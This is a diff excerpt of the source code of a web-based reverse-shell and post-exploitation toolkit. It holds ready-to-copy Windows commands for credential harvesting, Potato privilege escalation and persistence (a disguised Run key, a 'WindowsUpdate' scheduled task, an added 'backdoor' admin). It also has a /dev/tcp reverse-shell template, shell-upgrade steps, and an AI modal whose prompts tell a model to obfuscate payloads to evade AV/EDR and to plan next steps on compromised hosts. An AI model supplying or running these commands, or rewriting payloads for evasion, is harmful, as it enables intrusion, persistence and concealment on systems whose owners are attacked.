+    {id:"w-files",phase:"Situational Awareness",title:"Interesting Files & Credentials",desc:"Search for stored creds, config files, and sensitive data.",commands:[{label:"Unattend/Sysprep files",cmd:"dir /s *unattend.xml *sysprep.xml 2>nul"},{label:"PowerShell history",cmd:"type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 2>nul"},{label:"Registry saved creds",cmd:"reg query HKLM /f password /t REG_SZ /s 2>nul | head"},{label:"Web.config files",cmd:"dir /s *web.config 2>nul"}],tip:"PowerShell history is gold — sysadmins often type credentials directly on the command line."},
+    {id:"w-potato",phase:"Privilege Escalation",title:"Token Impersonation (Potato)",desc:"SeImpersonatePrivilege enables Potato-style SYSTEM escalation.",commands:[{label:"Check impersonate priv",cmd:"whoami /priv | findstr Impersonate"},{label:"GodPotato (Win10/Server 2019+)",cmd:"GodPotato.exe -cmd \"cmd /c whoami\""},{label:"PrintSpoofer (SYSTEM shell)",cmd:"PrintSpoofer.exe -i -c cmd"},{label:"JuicyPotato (legacy)",cmd:"JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}"}],tip:"SeImpersonatePrivilege is present on ALL service accounts (IIS, MSSQL, etc.). GodPotato is the modern go-to."},
+    {id:"w-persist",phase:"Persistence",title:"Establish Persistence",desc:"Maintain access after reboot or session end.",commands:[{label:"Registry Run key",cmd:"reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WinUpdate /t REG_SZ /d \"C:\\Users\\Public\\shell.exe\" /f"},{label:"Scheduled task",cmd:"schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Users\\Public\\shell.exe\" /sc onlogon /ru SYSTEM /f"},{label:"Add local admin",cmd:"net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add"}],tip:"Registry Run key + renamed obfuscated binary is the most common persistence technique."},
+  ],
+};
+
+/* ══════════════════════════════════════════════════════
+   SHARED CONFIG
+══════════════════════════════════════════════════════ */
+const CATS=[
+  {id:"all",icon:"◈",label:"All"},{id:"listener",icon:"⊕",label:"Listeners"},
+  {id:"bash",icon:"❯",label:"Bash"},{id:"python",icon:"⌬",label:"Python"},
+  {id:"php",icon:"⊘",label:"PHP"},{id:"powershell",icon:"⊞",label:"PowerShell"},
+  {id:"netcat",icon:"⊛",label:"Netcat"},{id:"socat",icon:"⊜",label:"Socat"},
+  {id:"go",icon:"◉",label:"Go"},{id:"rust",icon:"⊗",label:"Rust"},
+  {id:"nodejs",icon:"⬡",label:"Node.js"},{id:"ruby",icon:"◆",label:"Ruby"},
+  {id:"perl",icon:"◇",label:"Perl"},{id:"java",icon:"☕",label:"Java"},
+  {id:"web",icon:"⊝",label:"Web/Stagers"},
+];
+const STEALTH_CFG=[
+  {n:1,label:"Loud",color:"#ff4444"},{n:2,label:"Basic",color:"#ff8800"},
+  {n:3,label:"Normal",color:"#ffd700"},{n:4,label:"Quiet",color:"#88ff00"},
+  {n:5,label:"Silent",color:"#00ffaa"},
+];
+const OS_ICON={linux:"🐧",windows:"⊞",macos:"⌘"};
+const OS_LABEL={linux:"Linux",windows:"Windows",macos:"macOS"};
+const ENCODERS={
+  none:{label:"Raw",fn:s=>s},url:{label:"URL",fn:s=>encodeURIComponent(s)},
+  b64:{label:"Base64",fn:s=>btoa(unescape(encodeURIComponent(s)))},
+  hex:{label:"Hex",fn:s=>Array.from(new TextEncoder().encode(s)).map(b=>b.toString(16).padStart(2,"0")).join("")},
+};
+const PORT_PRESETS=[{p:"443",note:"HTTPS — rarely blocked"},{p:"80",note:"HTTP — most allowed"},{p:"8080",note:"Proxy alt"},{p:"4444",note:"MSF default"},{p:"9001",note:"Common CTF"},{p:"1337",note:"Elite 😄"}];
+const UPGRADES=[
+  {label:"1. Spawn PTY",cmd:`python3 -c 'import pty;pty.spawn("/bin/bash")'`,note:"Run on TARGET"},
+  {label:"2. Background shell",cmd:`# Press Ctrl+Z`,note:"ATTACKER — backgrounds nc"},
+  {label:"3. Fix terminal",cmd:`stty raw -echo; fg`,note:"ATTACKER — disable local echo"},
+  {label:"4. Set TERM",cmd:`export TERM=xterm\nstty rows 40 cols 160`,note:"TARGET — match your terminal size"},
+  {label:"Alt: Script",cmd:`script /dev/null -c bash`,note:"TARGET — if Python is unavailable"},
+];
+const IS={background:"rgba(255,255,255,0.04)",border:"1px solid #1a2a1a",borderRadius:7,color:"#00ffaa",padding:"6px 10px",fontSize:12,fontFamily:"'Fira Code','Cascadia Code',monospace",outline:"none",transition:"border-color .2s"};
+
+/* ══════════════════════════════════════════════════════
+   UTILITY COMPONENTS
+══════════════════════════════════════════════════════ */
+function CopyBtn({text,small,label,onCopy}){
+  const[ok,setOk]=useState(false);
+  const go=e=>{
+    e.stopPropagation();
+    const copy=()=>{setOk(true);setTimeout(()=>setOk(false),1800);if(window.__toast)window.__toast("Copied!");if(onCopy)onCopy(text);};
+    navigator.clipboard?.writeText(text).then(copy).catch(()=>{const t=document.createElement("textarea");t.value=text;document.body.appendChild(t);t.select();document.execCommand("copy");document.body.removeChild(t);copy();});
+  };
+  return <button onClick={go} style={{background:ok?"rgba(0,255,170,0.12)":"rgba(255,255,255,0.04)",border:`1px solid ${ok?"#00ffaa44":"#1a2a1a"}`,borderRadius:6,color:ok?"#00ffaa":"#3a5a3a",padding:small?"3px 8px":"4px 10px",fontSize:small?9:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,transition:"all .2s",whiteSpace:"nowrap",flexShrink:0}}>{ok?"✓ COPIED":label||"⎘ COPY"}</button>;
+}
+function StealthDots({n}){
+  if(!n)return null;const c=STEALTH_CFG[n-1];
+  return <div style={{display:"flex",alignItems:"center",gap:5,flexShrink:0}}><div style={{display:"flex",gap:2}}>{[1,2,3,4,5].map(i=><div key={i} style={{width:5,height:12,borderRadius:2,background:i<=n?c.color:"#111e11"}}/>)}</div><span style={{fontSize:9,color:c.color,fontFamily:"monospace",fontWeight:700,letterSpacing:1}}>{c.label.toUpperCase()}</span></div>;
+}
+function InfoRow({icon,label,value,color,mono,copyable}){
+  return <div style={{padding:"9px 14px",borderRight:"1px solid #0d1a0d",borderBottom:"1px solid #0d1a0d"}}><div style={{display:"flex",alignItems:"center",gap:5,marginBottom:4}}><span style={{color,fontSize:10}}>{icon}</span><span style={{fontSize:9,color:"#2a4a2a",fontFamily:"monospace",letterSpacing:1.5}}>{label}</span></div><div style={{display:"flex",alignItems:"flex-start",gap:6}}><span style={{fontSize:11,color:mono?"#88cc88":"#5a7a5a",fontFamily:mono?"'Fira Code',monospace":"inherit",lineHeight:1.5,flex:1,wordBreak:"break-word"}}>{value}</span>{copyable&&<CopyBtn text={value}/>}</div></div>;
+}
+function SL({children}){return <div style={{color:"#2a4a2a",fontSize:9,fontFamily:"monospace",letterSpacing:2,marginBottom:7}}>{children}</div>;}
+function SelBtn({label,active,onClick,color}){
+  const ac=color||"#00ffaa";
+  return <button onClick={onClick} style={{background:active?`${ac}12`:"rgba(255,255,255,0.02)",border:`1px solid ${active?`${ac}44`:"#1a2a1a"}`,borderRadius:6,color:active?ac:"#3a5a3a",padding:"5px 12px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,transition:"all .15s",whiteSpace:"nowrap"}}>{label}</button>;
+}
+function PayloadBox({text,lang}){
+  return <div style={{background:"#040a04",border:"1px solid #0d2a0d",borderRadius:8,padding:"11px 12px",position:"relative"}}>{lang&&<span style={{position:"absolute",top:8,left:10,fontSize:9,color:"#1e3a1e",fontFamily:"monospace",letterSpacing:1}}>{lang}</span>}<div style={{position:"absolute",top:8,right:8}}><CopyBtn text={text}/></div><pre style={{margin:0,fontFamily:"'Fira Code',monospace",fontSize:11.5,color:"#00ffaa",lineHeight:1.7,whiteSpace:"pre-wrap",wordBreak:"break-all",paddingRight:75,paddingTop:lang?14:0}}>{text}</pre></div>;
+}
+function Toast({message,visible}){
+  return <div style={{position:"fixed",bottom:24,left:"50%",transform:`translateX(-50%) translateY(${visible?0:12}px)`,background:"rgba(0,20,0,0.95)",border:"1px solid rgba(0,255,170,0.3)",borderRadius:8,padding:"8px 18px",color:"#00ffaa",fontSize:11,fontFamily:"monospace",letterSpacing:1,zIndex:9999,opacity:visible?1:0,transition:"opacity .25s, transform .25s",pointerEvents:"none",whiteSpace:"nowrap",boxShadow:"0 4px 24px rgba(0,0,0,0.6)"}}>✓ {message}</div>;
+}
+function SSLPanel({ip}){
+  return <div style={{background:"rgba(0,170,255,0.02)",border:"1px solid rgba(0,170,255,0.12)",borderRadius:10,padding:"14px 16px",marginBottom:16}}>
+    <div style={{color:"#00aaff",fontSize:10,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:12}}>🔒 SSL CERTIFICATE SETUP</div>
+    {[{label:"Generate self-signed cert",cmd:`openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=${ip||"10.10.10.10"}"`,note:"Run on ATTACKER"},
+      {label:"Verify cert",cmd:`openssl x509 -in cert.pem -noout -text | head -20`,note:"Check details"},
+      {label:"Combine for socat",cmd:`cat cert.pem key.pem > fullchain.pem`,note:"Some socat versions need combined file"},
+    ].map(u=><div key={u.label} style={{marginBottom:10}}>
+      <div style={{color:"#00aaff99",fontSize:10,fontFamily:"monospace",marginBottom:3}}>{u.label} — <span style={{color:"#1a3a5a"}}>{u.note}</span></div>
+      <div style={{display:"flex",gap:8}}><pre style={{flex:1,margin:0,background:"#040a0e",border:"1px solid rgba(0,170,255,0.1)",borderRadius:6,padding:"7px 10px",color:"#0088cc",fontFamily:"monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.6}}>{u.cmd}</pre><CopyBtn text={u.cmd}/></div>
+    </div>)}
+  </div>;
+}
+function UpgradePanel(){
+  return <div style={{background:"rgba(255,215,0,0.02)",border:"1px solid rgba(255,215,0,0.1)",borderRadius:10,padding:"14px 16px",marginBottom:16}}>
+    <div style={{color:"#ffd700",fontSize:11,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:4}}>⬆ TTY UPGRADE — Full Interactive Shell</div>
+    <p style={{color:"#554400",fontSize:11,margin:"0 0 12px",lineHeight:1.6}}>A raw netcat shell lacks arrow keys, tab completion, and Ctrl+C. Follow these steps immediately after catching a shell.</p>
+    {UPGRADES.map(u=><div key={u.label} style={{marginBottom:10}}>
+      <div style={{color:"#ffd700",fontSize:10,fontFamily:"monospace",fontWeight:700,marginBottom:3}}>{u.label} — <span style={{color:"#443300",fontWeight:400}}>{u.note}</span></div>
+      <div style={{display:"flex",gap:8}}><pre style={{flex:1,margin:0,background:"#060809",border:"1px solid rgba(255,215,0,0.07)",borderRadius:6,padding:"7px 10px",color:"#aa8800",fontFamily:"monospace",fontSize:11,whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.6}}>{u.cmd}</pre><CopyBtn text={u.cmd}/></div>
+    </div>)}
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   ONBOARDING BANNER
+══════════════════════════════════════════════════════ */
+function OnboardBanner({onDismiss}){
+  return <div style={{background:"linear-gradient(135deg,rgba(0,255,170,0.03),rgba(0,0,0,0))",border:"1px solid rgba(0,255,170,0.12)",borderRadius:12,padding:"18px 20px",marginBottom:18,position:"relative"}}>
+    <button onClick={onDismiss} style={{position:"absolute",top:12,right:14,background:"none",border:"1px solid #1a2a1a",borderRadius:5,color:"#2a4a2a",padding:"3px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace"}}>✕ Dismiss</button>
+    <div style={{color:"#00ffaa",fontSize:11,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:14}}>🎓 QUICK START GUIDE</div>
+    <div style={{display:"grid",gridTemplateColumns:"repeat(auto-fill,minmax(190px,1fr))",gap:10}}>
+      {[{icon:"01",color:"#00ffaa",title:"Set LHOST & LPORT",body:"Enter your attacker IP and port in the header — every shell updates live."},
+        {icon:"02",color:"#ffd700",title:"Browse or use Workflow",body:"Filter by OS, stealth level, or click ⚡ Workflow for a guided recommendation."},
+        {icon:"03",color:"#ff8800",title:"Copy → Catch",body:"Copy the payload, run it on target, catch the shell on your listener."},
+        {icon:"04",color:"#88ff00",title:"Level up",body:"Use Post-Exploitation tab to enumerate, escalate, and persist after the shell lands."},
+      ].map(s=><div key={s.icon} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #0d1a0d",borderRadius:8,padding:"10px 12px"}}>
+        <div style={{fontSize:9,color:s.color,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:4}}>{s.icon}</div>
+        <div style={{color:"#99bb99",fontSize:11,fontWeight:600,marginBottom:3}}>{s.title}</div>
+        <div style={{color:"#3a5a3a",fontSize:10,lineHeight:1.5}}>{s.body}</div>
+      </div>)}
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   HISTORY PANEL
+══════════════════════════════════════════════════════ */
+function HistoryPanel({history,onClear,onClose}){
+  return <div style={{position:"fixed",top:0,right:0,bottom:0,width:420,maxWidth:"95vw",background:"#080e08",borderLeft:"1px solid rgba(0,255,170,0.15)",zIndex:700,display:"flex",flexDirection:"column",animation:"slideIn .2s ease"}}>
+    <div style={{padding:"16px 18px",borderBottom:"1px solid #0a140a",display:"flex",alignItems:"center",justifyContent:"space-between"}}>
+      <div><div style={{color:"#cce8cc",fontSize:13,fontWeight:700,fontFamily:"monospace"}}>📋 Copy History</div><div style={{color:"#2a4a2a",fontSize:10,marginTop:2}}>Last {history.length} copied payloads</div></div>
+      <div style={{display:"flex",gap:8}}><button onClick={onClear} style={{background:"none",border:"1px solid #1a2a1a",borderRadius:5,color:"#2a4a2a",padding:"4px 8px",fontSize:9,cursor:"pointer",fontFamily:"monospace"}}>Clear</button><button onClick={onClose} style={{background:"none",border:"none",color:"#3a5a3a",cursor:"pointer",fontSize:18,lineHeight:1}}>×</button></div>
+    </div>
+    <div style={{flex:1,overflowY:"auto",padding:"10px"}}>
+      {history.length===0?<div style={{textAlign:"center",padding:"40px 0",color:"#1e3a1e",fontSize:12}}>No history yet. Copy a payload first.</div>:
+        history.slice().reverse().map((h,i)=><div key={i} style={{background:"rgba(255,255,255,0.02)",border:"1px solid #0d1a0d",borderRadius:8,padding:"10px 12px",marginBottom:6}}>
+          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:6}}>
+            <span style={{fontSize:9,color:"#2a4a2a",fontFamily:"monospace"}}>{new Date(h.ts).toLocaleTimeString()}</span>
+            <CopyBtn text={h.text} small/>
+          </div>
+          <pre style={{margin:0,fontFamily:"'Fira Code',monospace",fontSize:10,color:"#4a7a4a",whiteSpace:"pre-wrap",wordBreak:"break-all",lineHeight:1.5,maxHeight:80,overflow:"hidden"}}>{h.text}</pre>
+        </div>)
+      }
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   DIFF VIEWER MODAL
+══════════════════════════════════════════════════════ */
+function DiffModal({onClose}){
+  const[a,setA]=useState("");const[b,setB]=useState("");
+  const diff=useMemo(()=>{
+    if(!a||!b)return null;
+    const maxLen=Math.max(a.length,b.length);
+    const result=[];let i=0;
+    while(i<maxLen){
+      const ca=a[i]||"";const cb=b[i]||"";
+      if(ca===cb){let run=ca;let j=i+1;while(j<maxLen&&(a[j]||"")===(b[j]||"")){run+=(a[j]||"");j++;}result.push({type:"same",text:run});i=j;}
+      else{result.push({type:"diff",textA:ca,textB:cb});i++;}
+    }
+    return result;
+  },[a,b]);
+  const same=diff?diff.filter(d=>d.type==="same").reduce((n,d)=>n+d.text.length,0):0;
+  const pct=a.length?Math.round(same/Math.max(a.length,b.length)*100):0;
+  return <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.78)",zIndex:700,display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(4px)"}} onClick={onClose}>
+    <div onClick={e=>e.stopPropagation()} style={{background:"#080e08",border:"1px solid rgba(0,255,170,0.2)",borderRadius:14,padding:"24px",width:700,maxWidth:"97vw",maxHeight:"88vh",overflowY:"auto"}}>
+      <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:16}}>
+        <div><div style={{color:"#cce8cc",fontSize:14,fontWeight:700,fontFamily:"monospace"}}>⚡ Payload Diff Viewer</div><div style={{color:"#2a4a2a",fontSize:11,marginTop:2}}>Compare two payloads character by character</div></div>
+        <button onClick={onClose} style={{background:"none",border:"none",color:"#2a4a2a",cursor:"pointer",fontSize:20}}>×</button>
+      </div>
+      <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12,marginBottom:14}}>
+        {[["Payload A",a,setA],[" Payload B",b,setB]].map(([label,val,setter])=><div key={label}>
+          <div style={{color:"#2a4a2a",fontSize:9,fontFamily:"monospace",letterSpacing:2,marginBottom:5}}>{label}</div>
+          <textarea value={val} onChange={e=>setter(e.target.value)} placeholder="Paste payload here…" rows={5} style={{...IS,width:"100%",boxSizing:"border-box",resize:"vertical",lineHeight:1.6}}/>
+        </div>)}
+      </div>
+      {diff&&<>
+        <div style={{display:"flex",gap:12,marginBottom:10,fontSize:11,fontFamily:"monospace"}}>
+          <span style={{color:"#00ffaa"}}>● Same: {same} chars ({pct}%)</span>
+          <span style={{color:"#ff4444"}}>● Different: {Math.max(a.length,b.length)-same} chars</span>
+        </div>
+        <div style={{background:"#040a04",border:"1px solid #0d2a0d",borderRadius:8,padding:"12px",fontFamily:"'Fira Code',monospace",fontSize:11,lineHeight:1.7,wordBreak:"break-all"}}>
+          {diff.map((d,i)=>d.type==="same"?<span key={i} style={{color:"#4a7a4a"}}>{d.text}</span>:<span key={i}><span style={{background:"rgba(255,68,68,0.3)",color:"#ff8888",borderRadius:2}}>{d.textA||"∅"}</span></span>)}
+        </div>
+        <div style={{marginTop:8,fontSize:9,color:"#1e3a1e",fontFamily:"monospace"}}>Highlighted chars = positions where payload A differs from B. ∅ = character only in the longer payload.</div>
+      </>}
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   CUSTOM SHELL IMPORT MODAL
+══════════════════════════════════════════════════════ */
+function CustomShellModal({onSave,onClose}){
+  const[name,setName]=useState("");const[cat,setCat]=useState("bash");
+  const[osv,setOsv]=useState("linux");const[tmpl,setTmpl]=useState("");
+  const[info,setInfo]=useState("");const[pair,setPair]=useState("nc -lvnp PORT");
+  const preview=useMemo(()=>tmpl.replace(/\{ip\}/g,"10.10.10.10").replace(/\{port\}/g,"4444"),[tmpl]);
+  const save=()=>{
+    if(!name.trim()||!tmpl.trim())return;
+    const shell={id:"custom_"+Date.now(),name:name.trim(),cat,os:[osv],stealth:3,tags:["custom"],info:info||"Custom imported shell",req:"User-defined",pair,caveat:"Custom shell — verify before use.",gen:({ip,port})=>tmpl.replace(/\{ip\}/g,ip).replace(/\{port\}/g,port),custom:true};
+    onSave(shell);onClose();
+  };
+  return <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.78)",zIndex:700,display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(4px)"}} onClick={onClose}>
+    <div onClick={e=>e.stopPropagation()} style={{background:"#080e08",border:"1px solid rgba(0,255,170,0.2)",borderRadius:14,padding:"24px",width:560,maxWidth:"97vw",maxHeight:"88vh",overflowY:"auto"}}>
+      <div style={{display:"flex",justifyContent:"space-between",marginBottom:16}}>
+        <div><div style={{color:"#cce8cc",fontSize:14,fontWeight:700,fontFamily:"monospace"}}>+ Import Custom Shell</div><div style={{color:"#2a4a2a",fontSize:11,marginTop:2}}>Use {"{ip}"} and {"{port}"} as placeholders in your template</div></div>
+        <button onClick={onClose} style={{background:"none",border:"none",color:"#2a4a2a",cursor:"pointer",fontSize:20}}>×</button>
+      </div>
+      <div style={{display:"flex",flexDirection:"column",gap:12}}>
+        <div><SL>NAME</SL><input value={name} onChange={e=>setName(e.target.value)} placeholder="My Custom Shell" style={{...IS,width:"100%",boxSizing:"border-box"}}/></div>
+        <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:12}}>
+          <div><SL>CATEGORY</SL>
+            <select value={cat} onChange={e=>setCat(e.target.value)} style={{...IS,width:"100%",appearance:"none"}}>
+              {["bash","python","php","powershell","netcat","socat","nodejs","ruby","perl","java","web","other"].map(c=><option key={c} value={c}>{c}</option>)}
+            </select>
+          </div>
+          <div><SL>OS TARGET</SL>
+            <select value={osv} onChange={e=>setOsv(e.target.value)} style={{...IS,width:"100%",appearance:"none"}}>
+              <option value="linux">Linux</option><option value="windows">Windows</option><option value="macos">macOS</option>
+            </select>
+          </div>
+        </div>
+        <div><SL>COMMAND TEMPLATE (use {"{ip}"} and {"{port}"})</SL><textarea value={tmpl} onChange={e=>setTmpl(e.target.value)} placeholder="bash -i >& /dev/tcp/{ip}/{port} 0>&1" rows={3} style={{...IS,width:"100%",boxSizing:"border-box",resize:"vertical"}}/></div>
+        <div><SL>DESCRIPTION</SL><input value={info} onChange={e=>setInfo(e.target.value)} placeholder="Brief description…" style={{...IS,width:"100%",boxSizing:"border-box"}}/></div>
+        <div><SL>LISTENER COMMAND</SL><input value={pair} onChange={e=>setPair(e.target.value)} style={{...IS,width:"100%",boxSizing:"border-box"}}/></div>
+        {tmpl&&<div><SL>PREVIEW (10.10.10.10:4444)</SL><PayloadBox text={preview}/></div>}
+        <button onClick={save} disabled={!name.trim()||!tmpl.trim()} style={{background:name.trim()&&tmpl.trim()?"rgba(0,255,170,0.1)":"rgba(255,255,255,0.02)",border:`1px solid ${name.trim()&&tmpl.trim()?"rgba(0,255,170,0.3)":"#1a2a1a"}`,borderRadius:8,color:name.trim()&&tmpl.trim()?"#00ffaa":"#2a4a2a",padding:"10px",fontSize:11,cursor:"pointer",fontFamily:"monospace",letterSpacing:1,transition:"all .2s"}}>✓ Save Shell</button>
+      </div>
+    </div>
+  </div>;
+}
+
+/* ══════════════════════════════════════════════════════
+   AI ADVISOR MODAL (3-mode: Advisor, Mutator, Analyzer)
+══════════════════════════════════════════════════════ */
+function AIAdvisorModal({ip,port,onClose}){
+  const[mode,setMode]=useState("advisor");
+  const[apiKey,setApiKey]=useLS("rvs2_apikey","");
+  const[loading,setLoading]=useState(false);const[error,setError]=useState(null);
+  // Advisor state
+  const[situation,setSituation]=useState("");const[advisorResult,setAdvisorResult]=useState(null);
+  // Mutator state
+  const[payload,setPayload]=useState("");const[target,setTarget]=useState("");const[mutResult,setMutResult]=useState(null);
+  // Analyzer state
+  const[cmdOutput,setCmdOutput]=useState("");const[anaResult,setAnaResult]=useState(null);
+  const shellList=SHELLS_BASE.map(s=>`- ${s.id}: ${s.name} (${s.cat}, os:${s.os?.join("/")||"any"}, stealth:${s.stealth||"?"}, tags:${s.tags?.join(",")}) — ${s.info}`).join("\n");
+
+  const callAPI=async(system,userMsg,onResult)=>{
+    if(!apiKey.trim()){setError("API key required");return;}
+    setLoading(true);setError(null);
+    try{
+      const res=await fetch("https://api.anthropic.com/v1/messages",{method:"POST",headers:{"Content-Type":"application/json","x-api-key":apiKey,"anthropic-version":"2023-06-01","anthropic-dangerous-direct-browser-access":"true"},body:JSON.stringify({model:"claude-sonnet-4-20250514",max_tokens:1500,system,messages:[{role:"user",content:userMsg}]})});
+      const data=await res.json();
+      if(data.error)throw new Error(data.error.message);
+      onResult(data.content?.[0]?.text||"");
+    }catch(e){setError(e.message);}
+    setLoading(false);
+  };
+
+  const runAdvisor=()=>{
+    if(!situation.trim())return;
+    callAPI(
+      `You are an expert penetration tester. Shell registry:\n\n${shellList}\n\nGiven the user's situation, recommend the BEST shell. Respond ONLY with valid JSON (no markdown, no backticks):\n{"shellId":"<id>","why":"<1-2 sentence explanation>","listener":"<exact listener command substituting LHOST=${ip||"ATTACKER"} PORT=${port||"4444"}>","warning":"<one gotcha>","alternatives":[{"shellId":"<id>","reason":"<why backup>"}]}`,
+      `My situation: ${situation}`,
+      text=>{
+        const cleaned=text.replace(/```json|```/g,"").trim();
+        const parsed=JSON.parse(cleaned);
+        const shell=SHELLS_BASE.find(s=>s.id===parsed.shellId);
+        const alts=(parsed.alternatives||[]).map(a=>({...a,shell:SHELLS_BASE.find(s=>s.id===a.shellId)})).filter(a=>a.shell);
+        setAdvisorResult({...parsed,shell,alts});
+      }
+    );
+  };
+
+  const runMutator=()=>{
+    if(!payload.trim())return;
+    callAPI(
+      `You are an expert red team operator specializing in AV/EDR evasion. Given a payload and target AV/EDR, rewrite the payload to evade detection while maintaining functionality. Respond with:\n1. The mutated/obfuscated payload (in a code block)\n2. A brief explanation of what techniques you used\n3. Any caveats or limitations`,
+      `Payload to mutate:\n\`\`\`\n${payload}\n\`\`\`\n\nTarget AV/EDR: ${target||"Windows Defender + basic EDR"}\n\nLHOST=${ip||"10.10.10.10"} LPORT=${port||"4444"}`,
+      text=>setMutResult(text)
+    );
+  };
+
+  const runAnalyzer=()=>{
+    if(!cmdOutput.trim())return;
+    callAPI(
+      `You are an expert penetration tester doing post-exploitation. Given command output from a compromised system, analyze it and provide:\n1. Key findings (what's interesting/exploitable)\n2. Immediate recommended next steps (prioritized)\n3. Specific commands to run next (ready to copy)\n4. Any warnings or things to watch out for\n\nFormat your response clearly with sections. Be concise and actionable.`,
+      `Command output from compromised host:\n\n${cmdOutput}`,
+      text=>setAnaResult(text)
+    );
+  };
+
+  return <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.78)",zIndex:600,display:"flex",alignItems:"center",justifyContent:"center",backdropFilter:"blur(5px)"}} onClick={onClose}>
+    <div onClick={e=>e.stopPropagation()} style={{background:"#080e08",border:"1px solid rgba(0,255,170,0.2)",borderRadius:14,padding:"24px",width:620,maxWidth:"97vw",maxHeight:"90vh",overflowY:"auto",display:"flex",flexDirection:"column",gap:14}}>
+      <div style={{display:"flex",justifyContent:"space-between",alignItems:"flex-start"}}>
+        <div><div style={{color:"#cce8cc",fontSize:14,fontWeight:700,fontFamily:"monospace"}}>🤖 AI Assistant</div><div style={{color:"#2a4a2a",fontSize:11,marginTop:3}}>Shell Advisor · Payload Mutator · Situation Analyzer</div></div>
+        <button onClick={onClose} style={{background:"none",border:"none",color:"#2a4a2a",cursor:"pointer",fontSize:20}}>×</button>
+      </div>
+      {/* API Key */}
+      <div style={{background:"rgba(0,170,255,0.03)",border:"1px solid rgba(0,170,255,0.12)",borderRadius:8,padding:"10px 14px"}}>
+        <div style={{color:"#0088cc",fontSize:9,fontFamily:"monospace",letterSpacing:2,marginBottom:5}}>ANTHROPIC API KEY (stored in localStorage)</div>
+        <div style={{display:"flex",gap:6}}>
+          <input type="password" value={apiKey} onChange={e=>setApiKey(e.target.value)} placeholder="sk-ant-api03-…" style={{...IS,flex:1,fontSize:11}}/>
+        </div>
+        <div style={{color:"#1a3a5a",fontSize:9,marginTop:4}}>Get key at console.anthropic.com — saved to localStorage (no server).</div>
+      </div>
+      {/* Mode tabs */}
+      <div style={{display:"flex",gap:6}}>
+        {[["advisor","🎯 Shell Advisor"],["mutator","🧬 Payload Mutator"],["analyzer","🔬 Situation Analyzer"]].map(([id,lbl])=><button key={id} onClick={()=>setMode(id)} style={{flex:1,background:mode===id?"rgba(0,255,170,0.08)":"rgba(255,255,255,0.02)",border:`1px solid ${mode===id?"rgba(0,255,170,0.3)":"#1a2a1a"}`,borderRadius:7,color:mode===id?"#00ffaa":"#3a5a3a",padding:"7px 8px",fontSize:10,cursor:"pointer",fontFamily:"monospace",letterSpacing:.5}}>{lbl}</button>)}
+      </div>
+      {/* ── ADVISOR ── */}
+      {mode==="advisor"&&<div style={{display:"flex",flexDirection:"column",gap:12}}>
+        <div>
+          <SL>DESCRIBE YOUR SITUATION</SL>
+          <textarea value={situation} onChange={e=>setSituation(e.target.value)} onKeyDown={e=>{if(e.key==="Enter"&&(e.ctrlKey||e.metaKey))runAdvisor();}} placeholder="e.g. I have RCE on a Linux box via a vulnerable PHP app. curl is available but the box is firewalled..." rows={3} style={{...IS,width:"100%",boxSizing:"border-box",resize:"vertical",lineHeight:1.6}}/>
+          <div style={{display:"flex",justifyContent:"flex-end",marginTop:6}}>
+            <button onClick={runAdvisor} disabled={!situation.trim()||loading} style={{background:"rgba(0,255,170,0.1)",border:"1px solid rgba(0,255,170,0.3)",borderRadius:7,color:"#00ffaa",padding:"7px 18px",fontSize:11,cursor:"pointer",fontFamily:"monospace",letterSpacing:1}}>{loading?"⟳ Thinking…":"⚡ Get Recommendation"}</button>
+          </div>
+        </div>
+        {!advisorResult&&!loading&&<div style={{display:"flex",flexDirection:"column",gap:4}}>
+          <SL>EXAMPLES</SL>
+          {["I have RCE on Apache, PHP available, need a shell back","Got code exec on Windows via scheduled task, PowerShell restricted","Jenkins Script Console on internal Linux box, outbound HTTP blocked","Tomcat manager access on a Java server, need to upload a shell"].map(ex=><button key={ex} onClick={()=>setSituation(ex)} style={{background:"none",border:"1px solid #0d1a0d",borderRadius:6,padding:"6px 10px",color:"#2a4a2a",fontSize:10,cursor:"pointer",fontFamily:"monospace",textAlign:"left",lineHeight:1.5}}>▸ {ex}</button>)}
+        </div>}
+        {error&&<div style={{background:"rgba(255,68,68,0.05)",border:"1px solid rgba(255,68,68,0.2)",borderRadius:8,padding:"10px",color:"#ff4444",fontSize:11}}>{error}</div>}
+        {advisorResult?.shell&&<div style={{background:"rgba(0,255,170,0.03)",border:"1px solid rgba(0,255,170,0.15)",borderRadius:10,padding:"14px"}}>
+          <div style={{color:"#00ffaa",fontSize:10,fontFamily:"monospace",fontWeight:700,letterSpacing:2,marginBottom:8}}>✓ RECOMMENDATION: {advisorResult.shell.name}</div>
+          <p style={{color:"#5a7a5a",fontSize:11,margin:"0 0 10px",lineHeight:1.6}}>{advisorResult.why}</p>
+          <PayloadBox text={advisorResult.shell.gen({ip:ip||"10.10.10.10",port:port||"4444"})}/>
